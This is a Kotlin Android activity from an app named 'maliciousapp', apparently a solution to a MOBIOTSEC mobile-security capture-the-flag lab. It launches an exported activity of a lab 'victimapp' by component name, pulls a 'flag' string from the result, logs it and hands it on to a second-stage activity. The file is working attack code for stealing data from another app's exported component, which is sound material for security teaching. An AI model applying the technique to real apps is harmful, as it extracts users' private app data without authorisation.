package com.example.maliciousapp

import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import android.util.Log

import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

class PartOne : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val intent = Intent().apply {
            component = ComponentName(
                "com.example.victimapp",
                "com.example.victimapp.PartOne"
            )
        }

        val contract = ActivityResultContracts.StartActivityForResult()
        registerForActivityResult(contract) { result ->
            val flagPart = result
                .data
                ?.getStringExtra("flag")
                ?: "[null]"

            Log.w("MOBIOTSEC", "Part 1: $flagPart")
            startActivity(
                Intent(this, PartTwo::class.java)
                    .putExtra("flag", flagPart)
            )
        }.launch(intent)
    }
}
